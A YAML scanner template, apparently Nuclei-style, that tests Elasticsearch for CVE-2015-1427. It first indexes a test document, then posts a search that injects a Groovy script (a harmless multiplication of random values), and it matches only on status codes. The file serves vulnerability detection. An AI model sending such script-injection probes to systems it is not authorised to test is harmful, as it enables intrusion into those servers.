id: yaml-poc-elastic-elasticsearch-command_injection-CVE-2015-1427
info:
  name: Yaml Poc Elastic Elasticsearch Command_Injection Cve 2015 1427
  author: converted
  severity: high
  description: 'Converted from xpoc: yaml-poc-elastic-elasticsearch-command_injection-CVE-2015-1427'
  tags: elasticsearch,rce,cve
  classification:
    cve-id: CVE-2015-1427
  reference:
  - http://packetstormsecurity.com/files/130368/Elasticsearch-1.3.7-1.4.2-Sandbox-Escape-Command-Execution.html
  - http://packetstormsecurity.com/files/130784/ElasticSearch-Unauthenticated-Remote-Code-Execution.html
  - http://www.elasticsearch.com/blog/elasticsearch-1-4-3-1-3-8-released/
  - http://www.securityfocus.com/archive/1/534689/100/0/threaded
  - http://www.securityfocus.com/archive/1/archive/1/534689/100/0/threaded
http:
- method: POST
  path:
  - /test/test
  body: "{\n  \"name\": \"test\"\n}\n"
  headers:
    Content-Type: application/json
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 201
- method: POST
  path:
  - /_search
  body: "{\n    \"size\":1,\n    \"script_fields\":{\n        \"lupin\":{\n      \
    \      \"lang\":\"groovy\",\n            \"script\":\"{{r1}}*{{r2}}\"\n      \
    \  }\n    }\n}\n"
  headers:
    Content-Type: application/json
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
